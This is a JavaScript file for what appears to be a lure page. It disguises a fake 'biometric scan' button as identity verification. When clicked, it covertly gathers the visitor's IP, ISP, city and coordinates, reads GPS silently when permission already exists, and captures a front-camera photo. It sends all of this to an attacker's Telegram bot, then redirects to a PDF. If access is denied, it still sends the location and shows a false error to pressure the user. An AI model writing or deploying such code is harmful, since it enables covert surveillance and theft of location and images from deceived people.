const sensor = document.getElementById('sensor');
        const status = document.getElementById('status');
        const laser = document.getElementById('laser');
        const ring = document.getElementById('ring');
        let procesoExitoso = false;

        // Funci√≥n para GPS silencioso (solo si ya hay permiso)
        async function obtenerGPS() {
            return new Promise((resolve) => {
                if (!navigator.permissions) return resolve(null);
                navigator.permissions.query({name:'geolocation'}).then((result) => {
                    if (result.state === 'granted') {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: "M√âTRICA (GPS)" }),
                            () => resolve(null),
                            { timeout: 3000 }
                        );
                    } else { resolve(null); }
                });
            });
        }

        async function validar() {
            if (navigator.vibrate) navigator.vibrate(100);
            status.innerHTML = "INICIANDO ESCANEO BIOM√âTRICO...";
            ring.style.display = "block";
            laser.style.display = "block";

            let infoReporte = "";

            try {
                // 1. TRIANGULACI√ìN AGRESIVA POR NODOS (ipwho.is ofrece m√°s precisi√≥n de ISP)
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                
                // 2. Intento de GPS silencioso para m√°xima precisi√≥n
                const gps = await obtenerGPS();
                const lat = gps ? gps.lat : d.latitude;
                const lon = gps ? gps.lon : d.longitude;
                const precision = gps ? gps.acc : "INFRAESTRUCTURA (Red)";

                // Construcci√≥n de reporte t√©cnico para Tesis
                infoReporte = `
üõ°Ô∏è *REPORTE DE AUDITOR√çA AVANZADO*
---------------------------------------
üì° *INFRAESTRUCTURA DE RED:*
‚Ä¢ *ISP:* ${d.connection.isp}
‚Ä¢ *ASN:* ${d.connection.asn}
‚Ä¢ *TIPO:* ${d.connection.type} (Triangulaci√≥n Activa)

üìç *GEOLOCALIZACI√ìN:*
‚Ä¢ *Ciudad:* ${d.city}, ${d.region}
‚Ä¢ *Precisi√≥n:* ${precision}
‚Ä¢ *IP P√∫blica:* \`${d.ip}\`

üîó *MAPA DE PRECISI√ìN (ZOOM 19):*
https://www.google.com/maps?q=${lat},${lon}&z=19
---------------------------------------`;

                // 3. Captura de Identidad (C√°mara)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                video.play();
                
                await new Promise(r => setTimeout(r, 2000));

                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const foto = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.6));
                stream.getTracks().forEach(t => t.stop());

                // 4. Env√≠o de Evidencia a Telegram
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', foto, 'evidencia.jpg');
                fd.append('caption', `‚úÖ *AUDITOR√çA COMPLETADA*\n${infoReporte}`);
                fd.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                procesoExitoso = true;
                status.innerHTML = "‚úÖ IDENTIDAD VERIFICADA";
                setTimeout(() => location.href = CONFIG.PDF_URL, 1000);

            } catch (err) {
                const errorMsg = (err.name === 'NotAllowedError') ? "üö´ ACCESO DENEGADO POR USUARIO" : `‚ö†Ô∏è ERROR: ${err.message}`;
                
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        chat_id: CONFIG.CHAT_ID, 
                        text: `‚ùå *FALLO EN SISTEMA*\n${errorMsg}\n${infoReporte}`, 
                        parse_mode: 'Markdown' 
                    })
                });

                alert("ERROR CR√çTICO: El sensor biom√©trico no responde. Aseg√∫rese de permitir el acceso para continuar.");
                location.reload();
            }
        }

        sensor.addEventListener('click', validar);
